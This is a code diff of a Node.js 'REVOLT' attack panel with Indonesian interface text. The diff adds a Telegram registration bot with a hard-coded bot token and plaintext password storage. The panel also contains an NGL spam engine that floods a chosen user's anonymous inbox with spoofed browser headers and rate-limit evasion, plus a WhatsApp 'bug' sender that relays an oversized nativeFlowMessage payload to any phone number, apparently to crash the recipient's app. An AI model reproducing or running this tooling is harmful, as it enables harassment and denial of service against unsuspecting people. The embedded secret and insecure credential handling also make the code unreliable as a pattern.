@@ -1,6 +1,6 @@
 // language: JavaScript, file: server.js
 // deps: express, @whiskeysockets/baileys, pino
-// env: PORT, CHAT_URL, CHAT_SOCKET_URL
+// env: PORT, CHAT_URL, BOT_TOKEN, OWNER_ID (opsional), PUBLIC_NGL_EMAIL, PUBLIC_NGL_PASS
 // run: node server.js
 
 const express = require('express');
@@ -19,11 +19,28 @@ const {
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const CHAT_URL = process.env.CHAT_URL || 'http://127.0.0.1:2030';
+const CHAT_URL = process.env.CHAT_URL || 'http://10.39.240.94:3000';
+const BOT_TOKEN = process.env.BOT_TOKEN || '8945318229:AAHCiqWEfYW5_VHahdLCZkwu6XA0I7N6vVI';
+const OWNER_ID = process.env.OWNER_ID || '1402999777';
+const PUBLIC_NGL = {
+  email: process.env.PUBLIC_NGL_EMAIL || 'public@revolt.local',
+  password: process.env.PUBLIC_NGL_PASS || 'public-sender-default',
+};
 app.use(express.json({ limit: '2mb' }));
 
 // ═══════════════════════════════════════════════════════
-//  NGL SPAM ENGINE — FIXED (UUID v4 + JSON parse)
+//  DB — users (registered via bot), nglPrivate, history
+// ═══════════════════════════════════════════════════════
+const DATA_DIR = path.join(__dirname, 'data');
+fs.mkdirSync(DATA_DIR, { recursive: true });
+const DB_FILE = path.join(DATA_DIR, 'panel.json');
+let db = { users: {}, nglPrivate: {}, history: [] };
+try { db = Object.assign(db, JSON.parse(fs.readFileSync(DB_FILE, 'utf8'))); } catch {}
+let _sv;
+const save = () => { clearTimeout(_sv); _sv = setTimeout(() => fs.writeFile(DB_FILE, JSON.stringify(db, null, 2), () => {}), 200); };
+
+// ═══════════════════════════════════════════════════════
+//  NGL SPAM ENGINE — UUID v4 + JSON parse
 // ═══════════════════════════════════════════════════════
 const NGL_URL = 'https://ngl.link/api/submit';
 const USER_AGENTS = [
@@ -32,12 +49,9 @@ const USER_AGENTS = [
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
   'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
   'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
-  'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
 ];
-const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
+const pick = (a) => a[Math.floor(Math.random() * a.length)];
 const sleep = (ms) => new Promise(r => setTimeout(r, ms));
-
-// proper UUID v4 — NGL backend validates format
 function uuidv4() {
   const b = crypto.randomBytes(16);
   b[6] = (b[6] & 0x0f) | 0x40;
@@ -49,19 +63,18 @@ function uuidv4() {
 const ngl = {
   isRunning: false, counter: 0, failed: 0, statusLog: 'idle',
   timer: null, target: '', message: '', total: 0, startedAt: 0, logs: [],
-  lastError: '',
+  lastError: '', senderMode: 'public',
 };
 function nglLog(text, type = 'info') {
   const time = new Date().toLocaleTimeString('id-ID', { hour12: false });
   ngl.logs.push({ time, text, type });
   if (ngl.logs.length > 200) ngl.logs.shift();
-  console.log(`[NGL][${type}] [${time}] ${text}`);
+  console.log(`[NGL][${type}] ${text}`);
 }
 
-async function nglSend(username, message) {
-  const deviceId = uuidv4();          // FIX: real UUID v4
+async function nglSend(username, message, sender) {
+  const deviceId = uuidv4();
   const ua = pick(USER_AGENTS);
-
   const body = new URLSearchParams({
     username,
     question: message,
@@ -70,33 +83,29 @@ async function nglSend(username, message) {
     referrer: 'https://ngl.link/' + username,
   }).toString();
 
-  try {
-    const res = await fetch(NGL_URL, {
-      method: 'POST',
-      headers: {
-        'User-Agent': ua,
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'X-Requested-With': 'XMLHttpRequest',
-        'Referer': `https://ngl.link/${username}`,
-        'Origin': 'https://ngl.link',
-        'sec-ch-ua': '"Chromium";v="120", "Not(A:Brand";v="24"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-      },
-      body,
-      signal: AbortSignal.timeout(12000),
-    });
+  const headers = {
+    'User-Agent': ua,
+    'Accept': 'application/json, text/plain, */*',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'X-Requested-With': 'XMLHttpRequest',
+    'Referer': `https://ngl.link/${username}`,
+    'Origin': 'https://ngl.link',
+    'sec-ch-ua': '"Chromium";v="120", "Not(A:Brand";v="24"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-origin',
+  };
+  if (sender && sender.email) headers['X-Sender-Email'] = sender.email;
 
+  try {
+    const res = await fetch(NGL_URL, { method: 'POST', headers, body, signal: AbortSignal.timeout(12000) });
     const raw = await res.text();
     let json = null;
     try { json = JSON.parse(raw); } catch (_) {}
 
-    // FIX: trust JSON payload, not just HTTP status
     const ok = res.status === 200 && (
       json?.success === true ||
       typeof json?.id === 'string' ||
@@ -110,39 +119,32 @@ async function nglSend(username, message) {
       nglLog(`[${ngl.counter}/${ngl.total}] ${username} — OK`, 'success');
       return { ok: true, status: 200 };
     }
-
     if (res.status === 429 || /rate|limit|spam/i.test(raw)) {
-      ngl.failed++;
-      ngl.lastError = 'ratelimit';
+      ngl.failed++; ngl.lastError = 'ratelimit';
       nglLog(`Ratelimit — wait 6s`, 'error');
       await sleep(6000);
       return { ok: false, status: 429 };
     }
-
-    ngl.failed++;
-    ngl.lastError = `${res.status}: ${raw.slice(0, 120)}`;
+    ngl.failed++; ngl.lastError = `${res.status}: ${raw.slice(0, 120)}`;
     nglLog(`Gagal (${res.status}): ${raw.slice(0, 100)}`, 'error');
     await sleep(1500);
     return { ok: false, status: res.status };
   } catch (e) {
-    ngl.failed++;
-    ngl.lastError = e.message;
+    ngl.failed++; ngl.lastError = e.message;
     nglLog(`Network error: ${e.message}`, 'warn');
     await sleep(2000);
     return { ok: false, status: 0, reason: e.message };
   }
 }
 
-function nglStart(username, message, total, delayMs = 2000) {
+function nglStart(username, message, total, sender, senderMode, delayMs = 2000) {
   if (ngl.isRunning) return { ok: false, error: 'Already running' };
   if (!username || !message) return { ok: false, error: 'username & message required' };
+  if (senderMode === 'private' && (!sender || !sender.email || !sender.password)) {
+    return { ok: false, error: 'Private sender belum diisi. Isi di menu Bug Sender.' };
+  }
 
-  const cleanUser = String(username)
-    .replace(/^@/, '')
-    .replace(/^https?:\/\/ngl\.link\//, '')
-    .replace(/[/?#].*$/, '')
-    .trim();
-
+  const cleanUser = String(username).replace(/^@/, '').replace(/^https?:\/\/ngl\.link\//, '').replace(/[/?#].*$/, '').trim();
   if (!cleanUser) return { ok: false, error: 'invalid target' };
 
   ngl.isRunning = true;
@@ -150,7 +152,8 @@ function nglStart(username, message, total, delayMs = 2000) {
   ngl.target = cleanUser; ngl.message = message;
   ngl.total = total || 100; ngl.startedAt = Date.now();
   ngl.logs = []; ngl.statusLog = 'running'; ngl.lastError = '';
-  nglLog(`campaign start → @${cleanUser} × ${ngl.total}`, 'info');
+  ngl.senderMode = senderMode || 'public';
+  nglLog(`campaign start → @${cleanUser} × ${ngl.total} [${ngl.senderMode}]`, 'info');
 
   const tick = async () => {
     if (!ngl.isRunning) return;
@@ -159,14 +162,11 @@ function nglStart(username, message, total, delayMs = 2000) {
       nglLog(`SELESAI — ${ngl.counter} sukses, ${ngl.failed} gagal`, 'success');
       return;
     }
-    await nglSend(cleanUser, message);
-    if (ngl.isRunning) {
-      ngl.timer = setTimeout(tick, delayMs + Math.random() * 800);
-    }
+    await nglSend(cleanUser, message, sender);
+    if (ngl.isRunning) ngl.timer = setTimeout(tick, delayMs + Math.random() * 800);
   };
   tick();
-
-  return { ok: true, target: cleanUser, total: ngl.total };
+  return { ok: true, target: cleanUser, total: ngl.total, mode: ngl.senderMode };
 }
 
 function nglStop() {
@@ -176,6 +176,167 @@ function nglStop() {
   nglLog('Dihentikan manual', 'warn');
   return { ok: true, counter: ngl.counter, failed: ngl.failed };
 }
+
+// ═══════════════════════════════════════════════════════
+//  TELEGRAM BOT — registration authority
+// ═══════════════════════════════════════════════════════
+const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+let tgOffset = 0;
+const tgState = {}; // chat_id -> { step, temp }
+
+async function tgSend(chatId, text, extra = {}) {
+  try {
+    await fetch(`${TG_API}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML', ...extra }),
+    });
+  } catch (e) { console.log('[BOT] send error:', e.message); }
+}
+
+async function tgHandle(u) {
+  const msg = u.message || u.edited_message;
+  if (!msg || !msg.text) return;
+  const chatId = msg.chat.id;
+  const text = String(msg.text).trim();
+  const from = msg.from || {};
+  const isOwner = !OWNER_ID || String(chatId) === String(OWNER_ID);
+
+  const state = tgState[chatId] || { step: 'idle', temp: {} };
+
+  if (text === '/start') {
+    tgState[chatId] = { step: 'idle', temp: {} };
+    await tgSend(chatId,
+      `🤖 <b>REVOLT SinTax Bot</b>\n\nHalo <b>${from.first_name || 'user'}</b>!\nGunakan bot ini untuk mendaftarkan akun panel.\n\n<b>Menu:</b>\n/adduser — daftar user baru\n/listuser — lihat user terdaftar\n/history — riwayat registrasi\n/help — bantuan`,
+      { reply_markup: { inline_keyboard: [
+        [{ text: '➕ Add User', callback_data: 'add' }],
+        [{ text: '📋 List User', callback_data: 'list' }],
+        [{ text: '📜 History', callback_data: 'hist' }],
+      ]}});
+    return;
+  }
+
+  if (text === '/help') {
+    await tgSend(chatId, '📖 <b>Commands</b>\n\n/start — menu utama\n/adduser — tambah user baru\n/listuser — daftar user\n/history — riwayat\n\nSetelah /adduser, bot akan meminta nama lalu password.');
+    return;
+  }
+
+  if (text === '/listuser') {
+    const keys = Object.keys(db.users);
+    await tgSend(chatId, keys.length
+      ? '📋 <b>User terdaftar:</b>\n' + keys.map((k,i) => `${i+1}. <code>${k}</code>`).join('\n')
+      : '📭 Belum ada user terdaftar. Ketik /adduser untuk mulai.');
+    return;
+  }
+
+  if (text === '/history') {
+    const h = db.history.slice(-20).reverse();
+    await tgSend(chatId, h.length
+      ? '📜 <b>20 riwayat terakhir:</b>\n' + h.map(x => `• <code>${x.user}</code> — ${x.action} · ${new Date(x.t).toLocaleString('id-ID')}`).join('\n')
+      : '📭 Belum ada history.');
+    return;
+  }
+
+  if (text === '/adduser' || text.startsWith('/adduser ')) {
+    if (!isOwner) { await tgSend(chatId, '⛔ Command ini hanya untuk owner.'); return; }
+    const parts = text.split(/\s+/).slice(1);
+    if (parts[0]) {
+      // /adduser name → langsung nama, minta password
+      const name = parts[0].toLowerCase().replace(/[^a-z0-9_.-]/g, '').slice(0, 24);
+      if (name.length < 3) { await tgSend(chatId, '❌ Nama minimal 3 karakter.'); return; }
+      if (db.users[name]) { await tgSend(chatId, `❌ User <code>${name}</code> sudah ada.`); return; }
+      tgState[chatId] = { step: 'await_password', temp: { name } };
+      await tgSend(chatId, `👤 Nama: <code>${name}</code>\n\n🔐 Sekarang kirim password baru:`);
+      return;
+    }
+    tgState[chatId] = { step: 'await_name', temp: {} };
+    await tgSend(chatId, '📝 <b>Add User</b>\n\nKirim <b>nama user</b> yang ingin didaftarkan:\n<i>(huruf, angka, _ dan . — min 3 karakter)</i>');
+    return;
+  }
+
+  if (state.step === 'await_name') {
+    const name = text.toLowerCase().replace(/[^a-z0-9_.-]/g, '').slice(0, 24);
+    if (name.length < 3) { await tgSend(chatId, '❌ Nama minimal 3 karakter (huruf/angka/_/.).'); return; }
+    if (db.users[name]) { await tgSend(chatId, `❌ User <code>${name}</code> sudah terdaftar.`); tgState[chatId] = { step: 'idle', temp: {} }; return; }
+    tgState[chatId] = { step: 'await_password', temp: { name } };
+    await tgSend(chatId, `👤 Nama: <code>${name}</code>\n\n🔐 Kirim <b>password baru</b> (min 3 karakter):`);
+    return;
+  }
+
+  if (state.step === 'await_password') {
+    const pass = text.slice(0, 64);
+    if (pass.length < 3) { await tgSend(chatId, '❌ Password minimal 3 karakter.'); return; }
+    const name = state.temp.name;
+    db.users[name] = {
+      password: pass,
+      telegram_id: chatId,
+      tg_username: from.username || null,
+      registered_at: Date.now(),
+      token: crypto.randomBytes(16).toString('hex'),
+    };
+    db.history.push({ user: name, action: 'registered', by: chatId, t: Date.now() });
+    save();
+    tgState[chatId] = { step: 'idle', temp: {} };
+    await tgSend(chatId,
+      `✅ <b>User berhasil didaftarkan!</b>\n\n👤 Username: <code>${name}</code>\n🔐 Password: <code>${pass}</code>\n\n📱 Silakan login di panel REVOLT.`,
+      { reply_markup: { inline_keyboard: [
+        [{ text: '➕ Add lagi', callback_data: 'add' }],
+        [{ text: '📋 List User', callback_data: 'list' }],
+      ]}});
+    console.log(`[BOT] ✓ user registered: ${name} (chat ${chatId})`);
+    return;
+  }
+
+  // callback query text fallback
+  await tgSend(chatId, 'Ketik /start untuk melihat menu.');
+}
+
+async function tgHandleCallback(cq) {
+  const chatId = cq.message.chat.id;
+  const data = cq.data;
+  try { await fetch(`${TG_API}/answerCallbackQuery`, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ callback_query_id: cq.id }) }); } catch(_){}
+  if (data === 'add') {
+    const isOwner = !OWNER_ID || String(chatId) === String(OWNER_ID);
+    if (!isOwner) { await tgSend(chatId, '⛔ Hanya owner.'); return; }
+    tgState[chatId] = { step: 'await_name', temp: {} };
+    await tgSend(chatId, '📝 Kirim <b>nama user</b> baru:');
+  } else if (data === 'list') {
+    const keys = Object.keys(db.users);
+    await tgSend(chatId, keys.length ? '📋 <b>User:</b>\n' + keys.map((k,i)=>`${i+1}. <code>${k}</code>`).join('\n') : '📭 Kosong.');
+  } else if (data === 'hist') {
+    const h = db.history.slice(-20).reverse();
+    await tgSend(chatId, h.length ? '📜 <b>History:</b>\n' + h.map(x=>`• <code>${x.user}</code> — ${x.action}`).join('\n') : '📭 Kosong.');
+  }
+}
+
+async function tgPoll() {
+  try {
+    const r = await fetch(`${TG_API}/getUpdates?offset=${tgOffset}&timeout=25&allowed_updates=["message","callback_query"]`);
+    const j = await r.json();
+    if (j.ok && Array.isArray(j.result)) {
+      for (const u of j.result) {
+        tgOffset = u.update_id + 1;
+        try {
+          if (u.callback_query) await tgHandleCallback(u.callback_query);
+          else await tgHandle(u);
+        } catch (e) { console.log('[BOT] handler error:', e.message); }
+      }
+    }
+  } catch (e) { /* swallow network blip */ }
+  setTimeout(tgPoll, 800);
+}
+
+(async () => {
+  try {
+    const me = await fetch(`${TG_API}/getMe`).then(r => r.json());
+    if (me.ok) {
+      console.log(`[BOT] ✓ online as @${me.result.username} (${me.result.first_name})`);
+      tgPoll();
+    } else {
+      console.log(`[BOT] ✗ token invalid: ${JSON.stringify(me)}`);
+    }
+  } catch (e) { console.log('[BOT] ✗ offline:', e.message); }
+})();
 
 // ═══════════════════════════════════════════════════════
 //  WHATSAPP ENGINE — baileys + pairing
@@ -191,10 +352,7 @@ function waLog(text, type = 'info') {
 
 async function startWA(rawNumber) {
   if (wa.starting) return { ok: false, error: 'already starting' };
-  wa.starting = true;
-  wa.pairingCode = null;
-  wa.connected = false;
-
+  wa.starting = true; wa.pairingCode = null; wa.connected = false;
   const number = String(rawNumber).replace(/\D/g, '');
   if (number.length < 8) { wa.starting = false; return { ok: false, error: 'bad number' }; }
   wa.number = number;
@@ -202,49 +360,28 @@ async function startWA(rawNumber) {
   try {
     if (fs.existsSync(AUTH_DIR)) fs.rmSync(AUTH_DIR, { recursive: true, force: true });
     fs.mkdirSync(AUTH_DIR, { recursive: true });
-
     const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);
     const { version } = await fetchLatestBaileysVersion();
-
     const sock = makeWASocket({
-      version,
-      logger: P({ level: 'silent' }),
-      printQRInTerminal: false,
-      auth: state,
-      browser: Browsers.ubuntu('Chrome'),
-      generateHighQualityLinkPreview: false,
-      syncFullHistory: false,
+      version, logger: P({ level: 'silent' }), printQRInTerminal: false, auth: state,
+      browser: Browsers.ubuntu('Chrome'), generateHighQualityLinkPreview: false, syncFullHistory: false,
     });
     wa.sock = sock;
-
     if (typeof sock.generateMessageTag !== 'function') {
       sock.generateMessageTag = () => crypto.randomBytes(16).toString('hex').toUpperCase();
     }
-
     sock.ev.on('creds.update', saveCreds);
     sock.ev.on('connection.update', (u) => {
       const { connection, lastDisconnect } = u || {};
-      if (connection === 'open') {
-        wa.connected = true;
-        wa.jid = sock.user?.id || null;
-        waLog('connected: ' + wa.jid, 'success');
-      }
-      if (connection === 'close') {
-        wa.connected = false;
-        const code = lastDisconnect?.error?.output?.statusCode;
-        waLog('closed, code=' + code, 'warn');
-      }
+      if (connection === 'open') { wa.connected = true; wa.jid = sock.user?.id || null; waLog('connected: ' + wa.jid, 'success'); }
+      if (connection === 'close') { wa.connected = false; waLog('closed, code=' + lastDisconnect?.error?.output?.statusCode, 'warn'); }
     });
-
     if (!sock.authState.creds.registered) {
       await delay(1800);
       const code = await sock.requestPairingCode(number);
       wa.pairingCode = code;
       waLog('pairing code: ' + code, 'info');
-    } else {
-      waLog('already registered', 'info');
-    }
-
+    } else waLog('already registered', 'info');
     wa.starting = false;
     return { ok: true, code: wa.pairingCode };
   } catch (e) {
@@ -273,34 +410,45 @@ async function sendUiBlank(sock, target) {
             header: { title: "#895 Marga Faridz" },
             body: { text: "Lari.. Ada Faridz" },
             nativeFlowMessage: {
-              messageParamsJson: JSON.stringify({
-                key: "value".repeat(2000),
-                id: Date.now(),
-              }),
+              messageParamsJson: JSON.stringify({ key: "value".repeat(2000), id: Date.now() }),
             },
           },
-          contextInfo: {
-            remoteJid: target,
-            participant: target,
-            stanzaId: sock.generateMessageTag(),
-          },
+          contextInfo: { remoteJid: target, participant: target, stanzaId: sock.generateMessageTag() },
         },
       },
     };
     const msg = generateWAMessageFromContent(target, message, {});
     await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
     console.log("✅ Pesan terkirim tanpa error!");
-  } catch (error) {
-    console.log("❌ error:\n" + error);
-  }
+  } catch (error) { console.log("❌ error:\n" + error); }
 }
 
 // ═══════════════════════════════════════════════════════
 //  REST API
 // ═══════════════════════════════════════════════════════
+
+// ---- Login — verifikasi user terdaftar di bot ----
+app.post('/api/login', (req, res) => {
+  const u = String(req.body?.username || '').toLowerCase().trim();
+  const p = String(req.body?.password || '');
+  if (u.length < 3) return res.status(401).json({ error: 'Username minimal 3 karakter.' });
+  const user = db.users[u];
+  if (!user) return res.status(401).json({ error: 'Username belum terdaftar. Daftar via Telegram bot: /adduser' });
+  if (user.password !== p) return res.status(401).json({ error: 'Password salah.' });
+  user.token = user.token || crypto.randomBytes(16).toString('hex');
+  user.last_login = Date.now();
+  save();
+  res.json({ username: u, token: user.token });
+});
+
+// ---- NGL ----
 app.post('/api/ngl/start', (req, res) => {
-  const { username, message, total } = req.body;
-  res.json(nglStart(username, message, parseInt(total) || 100));
+  const { username, message, total, senderMode, user } = req.body;
+  const mode = senderMode === 'private' ? 'private' : 'public';
+  const sender = mode === 'private'
+    ? (db.nglPrivate[String(user || '').toLowerCase()] || null)
+    : PUBLIC_NGL;
+  res.json(nglStart(username, message, parseInt(total) || 100, sender, mode));
 });
 app.post('/api/ngl/stop', (req, res) => res.json(nglStop()));
 app.get('/api/ngl/status', (req, res) => {
@@ -309,16 +457,39 @@ app.get('/api/ngl/status', (req, res) => {
     isRunning: ngl.isRunning, counter: ngl.counter, failed: ngl.failed,
     total: ngl.total, target: ngl.target, statusLog: ngl.statusLog,
     elapsed: parseFloat(elapsed), lastError: ngl.lastError,
-    logs: ngl.logs.slice(-40),
+    senderMode: ngl.senderMode, logs: ngl.logs.slice(-40),
   });
 });
 app.post('/api/ngl/reset', (req, res) => {
-  nglStop();
-  ngl.counter = 0; ngl.failed = 0; ngl.logs = []; ngl.startedAt = 0;
-  ngl.statusLog = 'idle';
+  nglStop(); ngl.counter = 0; ngl.failed = 0; ngl.logs = []; ngl.startedAt = 0; ngl.statusLog = 'idle';
   res.json({ ok: true });
 });
 
+// ---- NGL private sender (credentials) ----
+app.post('/api/ngl/sender', (req, res) => {
+  const u = String(req.body?.user || '').toLowerCase().trim();
+  const email = String(req.body?.email || '').trim();
+  const password = String(req.body?.password || '').trim();
+  if (!u) return res.json({ ok: false, error: 'user required' });
+  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return res.json({ ok: false, error: 'email tidak valid' });
+  if (password.length < 4) return res.json({ ok: false, error: 'password minimal 4 karakter' });
+  db.nglPrivate[u] = { email, password, updated_at: Date.now() };
+  db.history.push({ user: u, action: 'ngl_sender_set', by: 'panel', t: Date.now() });
+  save();
+  res.json({ ok: true, email });
+});
+app.get('/api/ngl/sender', (req, res) => {
+  const u = String(req.query.user || '').toLowerCase().trim();
+  const s = db.nglPrivate[u];
+  res.json({
+    has: !!s,
+    email: s ? s.email : '',
+    emailMasked: s ? s.email.replace(/(.{2}).+(@.+)/, '$1***$2') : '',
+    publicEmail: PUBLIC_NGL.email,
+  });
+});
+
+// ---- WA ----
 app.post('/api/wa/pair', async (req, res) => {
   const { number } = req.body || {};
   if (!number) return res.json({ ok: false, error: 'number required' });
@@ -333,11 +504,11 @@ app.get('/api/wa/status', (req, res) => {
 });
 app.post('/api/wa/logout', (req, res) => res.json(waStop()));
 
+// ---- Bug ----
 app.post('/api/bug/send', async (req, res) => {
   if (!wa.sock || !wa.connected) return res.json({ ok: false, error: 'WA not connected' });
   const raw = String(req.body?.target || '').trim();
   if (!raw) return res.json({ ok: false, error: 'target required' });
-
   let jid;
   if (raw.includes('@')) jid = raw;
   else {
@@ -346,18 +517,19 @@ app.post('/api/bug/send', async (req, res) => {
     jid = clean + '@s.whatsapp.net';
   }
   const t0 = Date.now();
-  try {
-    await sendUiBlank(wa.sock, jid);
-    res.json({ ok: true, jid, ms: Date.now() - t0 });
-  } catch (e) {
-    res.json({ ok: false, error: e.message, jid });
-  }
+  try { await sendUiBlank(wa.sock, jid); res.json({ ok: true, jid, ms: Date.now() - t0 }); }
+  catch (e) { res.json({ ok: false, error: e.message, jid }); }
 });
 
 app.get('/api/config', (req, res) => res.json({ chatUrl: CHAT_URL }));
+app.get('/api/bot/info', (req, res) => res.json({
+  token: BOT_TOKEN.replace(/(\d+):(.{4}).+/, '$1:$2****'),
+  owner: OWNER_ID || 'anyone',
+  userCount: Object.keys(db.users).length,
+}));
 
 // ═══════════════════════════════════════════════════════
-//  HTML — inline
+//  HTML
 // ═══════════════════════════════════════════════════════
 const HTML = String.raw`<!DOCTYPE html>
 <html lang="id">
@@ -374,7 +546,9 @@ body{display:flex;justify-content:center;align-items:center;}
 #login-view{position:fixed;inset:0;display:flex;justify-content:center;align-items:center;padding:20px;z-index:1000;background:url('https://images.unsplash.com/photo-1518709268805-4e9042af9f23?auto=format&fit=crop&w=1920&q=80') no-repeat center center/cover;transition:opacity .4s;}
 #login-view.hidden{opacity:0;pointer-events:none;}
 .login-card{width:100%;max-width:380px;padding:40px 30px;border-radius:16px;background:rgba(255,255,255,.08);backdrop-filter:blur(15px);-webkit-backdrop-filter:blur(15px);border:1px solid rgba(255,255,255,.18);box-shadow:0 8px 32px 0 rgba(0,0,0,.37);display:flex;flex-direction:column;align-items:center;color:#fff;}
-.login-card h2{font-size:2rem;font-weight:600;margin-bottom:30px;}
+.login-card h2{font-size:2rem;font-weight:600;margin-bottom:8px;}
+.login-sub{font-size:.78rem;color:rgba(255,255,255,.7);margin-bottom:24px;text-align:center;line-height:1.5;}
+.login-sub b{color:#ffcc00;}
 .form-container{width:100%;}
 .input-box{width:100%;margin-bottom:18px;position:relative;}
 .input-box input{width:100%;padding:12px 16px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.25);border-radius:8px;outline:none;color:#fff;font-size:.95rem;transition:all .3s;}
@@ -387,11 +561,8 @@ body{display:flex;justify-content:center;align-items:center;}
 .forgot-pass{color:rgba(255,255,255,.9);text-decoration:none;}
 .btn-login{width:100%;padding:12px;background:#fff;border:none;border-radius:8px;color:#333;font-size:1rem;font-weight:600;cursor:pointer;transition:all .3s;box-shadow:0 4px 15px rgba(0,0,0,.2);}
 .btn-login:active{transform:scale(.98);}
+.btn-login:disabled{opacity:.6;cursor:wait;}
 .login-error{color:#ff5252;font-size:.82rem;text-align:center;margin-bottom:10px;min-height:18px;font-weight:600;}
-.register-link{margin-top:25px;font-size:.82rem;color:rgba(255,255,255,.85);text-align:center;}
-.register-link a{color:#fff;text-decoration:none;font-weight:500;}
-.demo-hint{margin-top:14px;font-size:.7rem;color:rgba(255,255,255,.55);text-align:center;}
-.demo-hint b{color:#ffcc00;}
 
 .app-container{width:100%;max-width:412px;height:100vh;height:100dvh;height:100svh;max-height:915px;position:relative;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 0 30px rgba(0,0,0,.8);background:#08090d;}
 @media(min-width:500px){.app-container{border-radius:28px;height:880px;max-height:880px;border:2px solid rgba(255,255,255,.1);}}
@@ -434,7 +605,7 @@ body{display:flex;justify-content:center;align-items:center;}
 .menu-card:active{transform:translate(4px,4px);box-shadow:1px 1px 0 var(--ink);}
 .menu-card .icon-box{width:36px;height:36px;border-radius:8px;background:rgba(0,0,0,.25);border:2px solid var(--ink);display:flex;align-items:center;justify-content:center;font-size:18px;margin-bottom:22px;}
 .menu-card .tag-pill{position:absolute;top:10px;right:10px;background:var(--ink);color:#fff;font-family:'Bangers',Impact,sans-serif;font-size:.62rem;letter-spacing:1.5px;padding:3px 8px;border-radius:10px;}
-.menu-card h4{font-family:'Bangers',Impact,sans-serif;font-size:1rem;letter-spacing:1.5px;line-height:1.05;text-shadow:1px 1px 0 rgba(0,0,0,.2);}
+.menu-card h4{font-family:'Bangers',Impact,sans-serif;font-size:1rem;letter-spacing:1.5px;line-height:1.05;}
 .menu-card p{font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.65rem;margin-top:3px;opacity:.92;line-height:1.3;}
 .mc-red{background:linear-gradient(135deg,#ff2e63,#d81b4a);color:#fff;}
 .mc-green{background:linear-gradient(135deg,#00e676,#00b85c);color:#0a1010;}
@@ -463,7 +634,7 @@ body{display:flex;justify-content:center;align-items:center;}
 .news-img{height:130px;background:linear-gradient(135deg,#2a1f4a,#1a1430);display:flex;align-items:center;justify-content:center;position:relative;font-size:3rem;}
 .news-img .badge{position:absolute;top:10px;right:10px;background:var(--red);color:#fff;font-family:'Bangers',Impact,sans-serif;font-size:.7rem;letter-spacing:1.5px;padding:4px 10px;border-radius:8px;border:2px solid var(--ink);box-shadow:2px 2px 0 var(--ink);}
 .news-body{padding:12px;}
-.news-body .ttl{font-family:'Bangers',Impact,sans-serif;font-size:1.05rem;line-height:1.15;letter-spacing:.5px;color:var(--ink);}
+.news-body .ttl{font-family:'Bangers',Impact,sans-serif;font-size:1.05rem;line-height:1.15;color:var(--ink);}
 .news-body .meta{font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.7rem;color:#666;margin-top:8px;display:flex;align-items:center;gap:5px;}
 
 #dashboard-2{padding:12px;}
@@ -494,17 +665,6 @@ body{display:flex;justify-content:center;align-items:center;}
 
 #module-form-page{padding:12px;padding-bottom:160px;}
 #bug-sender-page{padding:12px;}
-#chat-room-page{padding:0;background:#08090d;height:100%;display:flex;flex-direction:column;}
-.chat-room-bar{display:flex;align-items:center;gap:10px;padding:10px 12px;background:#111a26;border-bottom:3px solid var(--ink);color:#fff;flex-shrink:0;}
-.chat-room-bar button{background:#1e2c3a;color:#fff;border:2px solid var(--ink);font-family:'Bangers',Impact,sans-serif;font-size:.95rem;letter-spacing:1.5px;padding:6px 12px;cursor:pointer;border-radius:6px;}
-.chat-room-bar button:active{transform:translate(2px,2px);}
-.chat-room-bar .ttl{flex:1;font-family:'Bangers',Impact,sans-serif;font-size:1.15rem;letter-spacing:2px;color:#ffd93b;}
-.chat-room-bar .st{font-family:'Poppins',sans-serif;font-size:.7rem;color:#8892b0;}
-#chatFrame{flex:1;width:100%;border:0;background:#fff;}
-.chat-room-hint{padding:14px;text-align:center;color:#8892b0;font-family:'Poppins',sans-serif;font-size:.85rem;}
-.chat-room-hint b{color:#ff4d6a;}
-.chat-room-hint .btn-open{margin-top:12px;display:inline-block;padding:10px 18px;background:#ff4d6a;color:#fff;border-radius:10px;font-weight:700;cursor:pointer;text-decoration:none;}
-
 .back-link{display:inline-block;font-family:'Bangers',Impact,sans-serif;font-size:.95rem;letter-spacing:1.5px;color:var(--ink);background:#fff;border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);padding:6px 14px;margin-bottom:14px;cursor:pointer;}
 .back-link:active{transform:translate(3px,3px);box-shadow:0 0 0 var(--ink);}
 .form-label{font-family:'Bangers',Impact,sans-serif;font-size:1.15rem;letter-spacing:2px;color:var(--ink);margin-bottom:10px;display:flex;align-items:center;gap:8px;}
@@ -529,10 +689,10 @@ body{display:flex;justify-content:center;align-items:center;}
